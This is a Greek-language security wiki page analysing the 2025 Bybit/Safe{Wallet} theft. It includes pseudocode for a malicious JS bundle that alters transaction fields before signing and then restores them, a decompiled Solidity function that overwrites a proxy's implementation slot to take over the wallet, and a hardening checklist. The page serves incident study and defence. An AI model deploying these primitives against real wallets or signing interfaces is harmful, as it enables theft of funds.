# Compromise της ροής υπογραφής Web3 & Takeover του Safe Delegatecall Proxy

{{#include ../../banners/hacktricks-training.md}}

## Επισκόπηση

Μια αλυσίδα κλοπής από cold-wallet συνδύασε ένα **supply-chain compromise του web UI του Safe{Wallet}** με ένα **on-chain delegatecall primitive που overwrote τον implementation pointer ενός proxy (slot 0)**. Τα βασικά συμπεράσματα είναι:

- Αν ένα dApp μπορεί να inject κώδικα στη ροή υπογραφής, μπορεί να κάνει έναν signer να παράγει μια έγκυρη **EIP-712 υπογραφή πάνω σε πεδία που έχει επιλέξει ο attacker**, ενώ επαναφέρει τα αρχικά δεδομένα του UI, ώστε οι υπόλοιποι signers να παραμείνουν ανενημέρωτοι.
- Τα Safe proxies αποθηκεύουν το `masterCopy` (implementation) στο **storage slot 0**. Ένα delegatecall προς ένα contract που γράφει στο slot 0 ουσιαστικά κάνει “upgrade” το Safe σε attacker logic, παρέχοντας πλήρη έλεγχο του wallet.

## Off-chain: Στοχευμένη μετάλλαξη υπογραφής στο Safe{Wallet}

Ένα παραποιημένο Safe bundle (`_app-*.js`) επιτέθηκε επιλεκτικά σε συγκεκριμένες διευθύνσεις Safe + signer. Η injected λογική εκτελέστηκε ακριβώς πριν από το signing call:<sup>[[1]](#references)[[3]](#references)</sup>
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Ιδιότητες της επίθεσης
- **Context-gated**: οι hard-coded allowlists για τα Safe/signers των θυμάτων απέτρεπαν τον θόρυβο και μείωναν την ανίχνευση.<sup>[[1]](#references)[[3]](#references)</sup>
- **Last-moment mutation**: τα πεδία (`to`, `data`, `operation`, gas) αντικαθίσταντο αμέσως πριν από το `signTransaction` και στη συνέχεια επαναφέρονταν, έτσι ώστε τα proposal payloads στο UI να φαίνονται benign, ενώ οι υπογραφές να αντιστοιχούν στο payload του attacker.
- **EIP-712 opacity**: τα wallets εμφάνιζαν structured data, αλλά δεν έκαναν decode το nested calldata ούτε τόνιζαν το `operation = delegatecall`, με αποτέλεσμα το mutated message να γίνεται ουσιαστικά blind-signed.

### Συνάφεια με το Gateway validation
Τα Safe proposals υποβάλλονται στο **Safe Client Gateway**. Πριν από τα hardened checks, το gateway μπορούσε να αποδεχτεί ένα proposal όπου τα `safeTxHash`/signature αντιστοιχούσαν σε διαφορετικά fields από εκείνα του JSON body, αν το UI τα ξαναέγραφε μετά το signing. Μετά το incident, το gateway απορρίπτει πλέον proposals των οποίων το hash/signature δεν αντιστοιχεί στο submitted transaction. Αντίστοιχο server-side hash verification θα πρέπει να επιβάλλεται σε οποιοδήποτε signing-orchestration API.

### Βασικά σημεία του incident Bybit/Safe του 2025
- Το drain του Bybit cold-wallet στις 21 Φεβρουαρίου 2025 (~401k ETH) επανέλαβε το ίδιο pattern: ένα compromised Safe S3 bundle ενεργοποιούνταν μόνο για Bybit signers και άλλαζε το `operation=0` → `1`, δείχνοντας το `to` σε ένα pre-deployed attacker contract που γράφει στο slot 0.<sup>[[1]](#references)[[3]](#references)</sup>
- Το Wayback-cached `_app-52c9031bfa03da47.js` δείχνει ότι η λογική βασιζόταν στο Safe του Bybit (`0x1db9…cf4`) και στις διευθύνσεις των signers, και στη συνέχεια γινόταν άμεσο rollback σε clean bundle δύο λεπτά μετά την εκτέλεση, αναπαράγοντας το τέχνασμα “mutate → sign → restore”.<sup>[[1]](#references)[[2]](#references)</sup>
- Το malicious contract (π.χ. `0x9622…c7242`) περιείχε απλές functions `sweepETH/sweepERC20`, καθώς και μια `transfer(address,uint256)` που γράφει στο implementation slot. Η εκτέλεση του `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` μετατόπισε το proxy implementation και παρείχε πλήρη έλεγχο.<sup>[[1]](#references)[[3]](#references)</sup>

## On-chain: Delegatecall proxy takeover μέσω slot collision

Τα Safe proxies διατηρούν το `masterCopy` στο **storage slot 0** και κάνουν delegate όλη τη λογική σε αυτό. Επειδή το Safe υποστηρίζει **`operation = 1` (delegatecall)**, οποιοδήποτε signed transaction μπορεί να δείξει σε ένα arbitrary contract και να εκτελέσει τον κώδικά του στο storage context του proxy.<sup>[[3]](#references)</sup>

Ένα attacker contract μιμήθηκε ένα ERC-20 `transfer(address,uint256)`, αλλά αντί γι’ αυτό έγραψε το `_to` στο slot 0:<sup>[[1]](#references)[[3]](#references)</sup>
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Διαδρομή εκτέλεσης:<sup>[[1]](#references)[[3]](#references)</sup>
1. Τα θύματα υπογράφουν `execTransaction` με `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Το Safe masterCopy επικυρώνει τις υπογραφές πάνω σε αυτές τις παραμέτρους.
3. Το Proxy εκτελεί delegatecall στο `attackerContract`· το σώμα της `transfer` γράφει στο slot 0.
4. Το slot 0 (`masterCopy`) δείχνει πλέον σε logic που ελέγχεται από τον attacker → **πλήρης takeover του wallet και drain των κεφαλαίων**.

### Σημειώσεις για Guard και version (hardening μετά το incident)
- Τα Safes >= v1.3.0 μπορούν να εγκαταστήσουν ένα **Guard** για να απορρίπτει `delegatecall` ή να επιβάλλει ACLs στα `to`/selectors· το Bybit χρησιμοποιούσε την v1.1.1, επομένως δεν υπήρχε hook του Guard. Απαιτείται αναβάθμιση των contracts (και επαναπροσθήκη των owners) για την απόκτηση αυτού του επιπέδου ελέγχου.

## Λίστα ελέγχου detection και hardening

- **Ακεραιότητα UI**: κάντε pin τα JS assets / SRI· παρακολουθείτε τις διαφορές των bundles· αντιμετωπίζετε το signing UI ως μέρος του trust boundary.
- **Επικύρωση κατά το signing**: hardware wallets με **EIP-712 clear-signing**· εμφανίζετε ρητά το `operation` και κάνετε decode το nested calldata. Απορρίπτετε το signing όταν `operation = 1`, εκτός αν το επιτρέπει η policy.
- **Έλεγχοι hash στην πλευρά του server**: gateways/services που κάνουν relay proposals πρέπει να υπολογίζουν ξανά το `safeTxHash` και να επικυρώνουν ότι οι υπογραφές αντιστοιχούν στα submitted fields.
- **Policies/allowlists**: κανόνες preflight για `to`, selectors, asset types και αποκλεισμός του delegatecall, εκτός από vetted flows. Απαιτείτε ένα internal policy service πριν από το broadcasting πλήρως υπογεγραμμένων transactions.
- **Σχεδιασμός contract**: αποφεύγετε την έκθεση αυθαίρετου delegatecall σε multisig/treasury wallets, εκτός αν είναι απολύτως απαραίτητο. Τοποθετείτε τους upgrade pointers μακριά από το slot 0 ή προστατεύετέ τους με explicit upgrade logic και access control.
- **Monitoring**: δημιουργείτε alert για executions μέσω delegatecall από wallets που διακρατούν treasury funds, καθώς και για proposals που αλλάζουν το `operation` από τα συνήθη patterns `call`.

## Αναφορές

- [1] [Forensic breakdown του Safe exploit στο Bybit από την AnChain.AI](https://www.anchain.ai/blog/bybit)
- [2] [Ανάλυση του Safe bundle compromise από τη Zero Hour Technology](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [Λεπτομερής technical analysis του Bybit hack (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
